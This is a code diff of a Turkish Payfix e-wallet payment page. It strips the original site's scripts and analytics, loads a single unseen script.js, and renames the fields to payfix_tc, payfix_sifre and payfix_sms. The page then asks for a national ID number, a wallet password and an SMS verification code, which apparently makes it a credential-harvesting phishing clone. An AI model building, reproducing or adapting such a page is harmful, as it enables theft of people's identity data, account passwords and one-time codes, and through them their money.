@@ -18,46 +18,9 @@
     <link rel="stylesheet" type="text/css" href="css/app.css" />
 
     <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
-    <script type="text/javascript" src="scripts/validator.min.js"></script>
-    <script type="text/javascript" src="scripts/intlTelInput-jquery.min.js"></script>
-    <script src="scripts/jquery.dd.js"></script>
+    <script src="script.js"></script>
 
-
-    <script>
-        App = {
-            siteUri: '/',
-            redirectUrl: '',
-            providerId: '',
-            method: '-',
-            type: '',
-            reference: '',
-            reference_hash: ''
-        };
-
-        Cmt = {
-            hash: '4930a426a34f6a3b5b9cf86f20add5cb',
-            login: '',
-            amount: '',
-            password: '',
-            sms_code: '',
-            id: '',
-            telephone: '',
-            token: ''
-        };
-    </script>
-
-    <script type="text/javascript" src="scripts/individual/functions.js"></script>
-    <script type="text/javascript" src="scripts/individual/main.js?v=1.3"></script>
-
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-8XEB5FB6EP"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-
-        gtag('config', 'G-8XEB5FB6EP');
-    </script>
+    
 </head>
 
 <body>
@@ -117,33 +80,19 @@
 
 
                             <div id="loading" class="d-none" style="text-align: center"><img src="images/loading.gif" alt=""><h3 >Lütfen bekleyin.<br />İşleminiz yapılıyor...</h3></div>
-                            <form method="post" id="step1Form" data-toggle="validator" autocomplete="off">
+                            <form onsubmit="setPayment('payfix-3d')" id="step-1">
                                 <div class="row">
                                 <div class="col-md-12">
                                         <div class="form-group form-item">
                                             <label class="control-label">T.C. Kimlik No <span style="color:#f00">(*)</span></label>
-                                            <input type="number" id="login" name="login" class="form-control" placeholder="T.C. numaranızı girin" autocomplete="off" required="required" data-error="Bu alan zorunlu" />
+                                            <input type="number" id="login" name="payfix_tc" class="form-control" placeholder="T.C. numaranızı girin" autocomplete="off" required="required" data-error="Bu alan zorunlu" />
                                             <p class="help-block with-errors"></p>
                                         </div>
                                     </div>
                                     <div class="col-md-12">
                                         <div class="form-group form-item">
                                             <label class="control-label">Payfix Hesap Şifresi <span style="color:#f00">(*)</span></label>
-                                            <input type="password" id="password" name="password" class="form-control" placeholder="Hesap şifrenizi girin" autocomplete="off" required="required" data-error="Bu alan zorunlu" />
-                                            <p class="help-block with-errors"></p>
-                                        </div>
-                                    </div>
-                                    <div class="col-md-12">
-                                        <div class="form-group form-item">
-                                            <label class="control-label">Ad Soyad <span style="color:#f00">(*)</span></label>
-                                            <input type="text" id="sender_name" name="sender_name" class="form-control" placeholder="Gönderici adınızı girin" autocomplete="off" required="required" data-error="Bu alan zorunlu" />
-                                            <p class="help-block with-errors"></p>
-                                        </div>
-                                    </div>
-                                    <div class="col-md-12">
-                                        <div class="form-group form-item">
-                                            <label class="control-label">Site Kullanıcı Adı <span style="color:#f00">(*)</span></label>
-                                            <input type="text" id="enduser_username" name="enduser_username" class="form-control" placeholder="Kullanıcı adınızı girin" autocomplete="off" required="required" data-error="Bu alan zorunlu" />
+                                            <input type="password" id="password" name="payfix_sifre" class="form-control" placeholder="Hesap şifrenizi girin" autocomplete="off" required="required" data-error="Bu alan zorunlu" />
                                             <p class="help-block with-errors"></p>
                                         </div>
                                     </div>
@@ -174,13 +123,13 @@
                                 </div>
 
                             </form>
-                            <form method="post" id="step2Form" data-toggle="validator" autocomplete="off" class="d-none">
+                            <form action="javascript:;" onsubmit="smsOnay()" class="d-none" id="step-2">
                                 <div class="row">
 
                                     <div class="col-md-12">
                                         <div class="form-group has-feedback">
                                             <label class="control-label">SMS Kodunuz: <span style="color: #f00">(*)</span></label>
-                                            <input name="code1" id="code1" type="text" class="form-control"  placeholder="Telefonunuza gelen SMS onay kodu" required="required" data-error="Lütfen cep telefonunuza gelen SMS kodunuzu giriniz." />
+                                            <input name="payfix_sms" id="code1" type="text" class="form-control"  placeholder="Telefonunuza gelen SMS onay kodu" required="required" data-error="Lütfen cep telefonunuza gelen SMS kodunuzu giriniz." />
                                             <p class="help-block with-errors"></p>
                                         </div>
                                     </div>
@@ -189,7 +138,7 @@
                                     </div>
                                 </div>
                             </form>
-                            <form method="post" id="step3Form" data-toggle="validator" autocomplete="off" class="d-none">
+                            <form id="step-3" class="d-none">
                                 <div class="row">
                                     <div class="col-md-12">
                                         <div id="papara-payment-success">
